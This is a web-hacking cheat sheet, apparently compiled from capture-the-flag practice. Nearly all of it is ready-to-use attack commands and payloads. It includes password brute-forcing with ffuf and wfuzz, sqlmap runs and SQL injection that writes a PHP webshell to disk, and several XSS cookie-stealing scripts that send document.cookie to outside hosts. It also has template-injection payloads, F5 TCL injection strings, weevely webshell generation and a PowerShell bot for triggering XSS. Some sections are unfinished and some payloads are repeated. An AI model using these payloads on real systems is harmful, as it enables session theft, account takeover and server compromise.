# Web Hacking
======

## Directory Busting
------
#### Gobuster
gobuster dir -u <ip> -w /usr/share/dirb/wordlists/big.txt
#### Dirbuster
dirb http://target/directory/ /usr/share/dirb/wordlists/common.txt
#### Find Parameters Wordlists
find . | grep -i param
#### Bust Parameter Names
wfuzz --hw 0 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://target.com/shell.php?FUZZ=id
#### Wfuzz Headers Through Proxy
wfuzz -u http://example.com/admin.php -H FUZZ:127.0.0.1 -w /usr/share/headers.txt -p 127.0.0.1:8080:HTTP
#### Wfuzz Multiple Parameters
wfuzz --hh 19 -u "http://10.10.36.35:8081/auth?login=FUZZ&password=FUZ2Z" -z file,users.txt -z file,/usr/share/wordlists/rockyou.txt
#### Wfuzz Subdomain Enumeration
wfuzz --hl 107 -u http://10.10.116.180 -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/commonspeak2-subdomains.txt
#### ffuf with Headers
ffuf -w ../wordlists/common.txt -H "Cookie: token=foo; ctfchallenge=bar" -u http://www.vulnbegin.co.uk/cpadmin/FUZZ
#### ffuf to brute password
ffuf -w ../wordlists/10-million-password-list-top-100.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: ctfchallenge=cookie" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200

## Local File Inclusion
------
#### List of Windows Files
<a href="http://pwnwiki.io/?_escaped_fragment_=presence/windows/blind.md#!presence/windows/blind.md">Windows Blind Files</a>

## SQL Injection
------
#### Basic sqlmap
sqlmap -u <target-url>
#### sqlmap maximum risk & specify DBMS
sqlmap -u <target-url> --DBMS=MSSQL 
#### Specific sqlmap
sqlmap -u <url> --data 'param1=foo&param2=bar' --cookie 'MYCOOKEID=foobar; ANOTHERCOOKIE=foobar2' -p param1 -D <database-name> --file-write=file.php --file-dest=/var/www/wp-content/uploads/2020/05/file.php
#### MySQL (Inject malicious PHP code into file)
SELECT '<?php passthru($_GET[cmd])?>' INTO OUTFILE '/var/www/cmd.php'
#### Sqlite (Into Outfile equivalent)
```
ATTACH DATABASE '/home/devnull/public_html/test.php' as pwn;
	CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES ("test");
```
#### Multiple Columns in a Single Column
' UNION SELECT username || '~' || password FROM users--
#### Allow login for user externally


## Odds & Ends
------
#### FireFox Browse Nonstandard Ports
about:config -- network.security.ports.banned.override (String <port-num>)
#### Webdav
sudo mount -t davfs http://<target-server>:<port> /mnt/webdav

## Wordpress
------
#### Post-Exploitation
Database credentials located in wp-config.php (cat wp-config.php | grep DB_)
#### Wordpress Scan
wpscan --url <domain>  -e ap,at,u,cb,dbe --password-attack 

## XSS
------
#### SVG - No spaces
<svg/OnLoad="`${prompt``}`">
#### Cookie Stealing
<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
#### Cookie Stealing
<iframe src=http://10.2.188.2 onload="this.src='http://10.2.188.2?' + document.cookie">
#### Cookie Stealing
<script>new Image().src="http://10.1.1.1/?cookie="+document.cookie;</script>
#### XSS Web Request
http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
#### SVG - No spaces
<svg/OnLoad="`${prompt``}`">
#### Cookie Stealing
<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
#### Cookie Stealing (with img)
function addImage(){var img = document.createElement('img');img.src = 'https://www.hooperlabs.xyz/' + document.cookie; document.body.appendChild(img);}; addImage();
#### Update Cookie within Browser
javascript:void(document.cookie="myCookie=thisismystolencookie");

## Crypto
------
#### ECB (ref)
<
#### Attacking ECB
+ 1. Determine the key block size.  Increment the PT by one until the CT changes by X bytes.  Usually 8 bytes or 16 bytes.
+   2. If possible, find an oracle.  That is, something that allows either PT --> CT or CT --> PT to arbitrary inputs
+   


## Cloud
------
#### Domain Hijacking
Have 404s pointing to a S3 bucket?  Take over the subdomain!
#### F5 TCL Injection (Send the following in JSESSIONID that doesn't respond typical JSESSIONID)
+ JSESSIONID=[TCP::respond {Hello ?}]
+ JSESIONID=[TCP::respond [info level 0]]
+ localhost
+  table set -subtable "cache" localhost {TCP::respond owned}


## SSTI
------
#### Jinja2 reads from templates directory
{{config}}

## CSTI
------
#### AngularJS
{{constructor.constructor('alert(123)')()}}
#### Vue
{{{}.toString.constructor('alert(123)')()}}

## Clone Websites
------
#### Download all files (wget)
wget -r -np -k <URL>

## Webshells
------
#### Generate password-protected webshell (weevely)
weevely generate mysecretpassword <path>
#### Interact with weevely webshell
weevely <url> mysecretpassword

## Create an XSS Victim Bot
------
#### PowerShell Bot to Execute JS
+ $ie = New-Object -com InternetExplorer.Application
+  $ie.visible=$true
+  $ie.navigate("http://vulnerable.com")
+  while($ie.ReadyState -ne 4){ start-sleep -m 1000 }
+  $ie.document.getElementsByName("username")[0].value="foo"
+  $ie.document.getElementsByName("password")[0].value="bar"
+  $ie.document.getElementsByClassName("btn")[0].click()
+  $ie.Quit()
+  [System.Runtime.Interopservices.Marshall]::ReleaseComObject($ie)
+  #Note... may need sleep statements
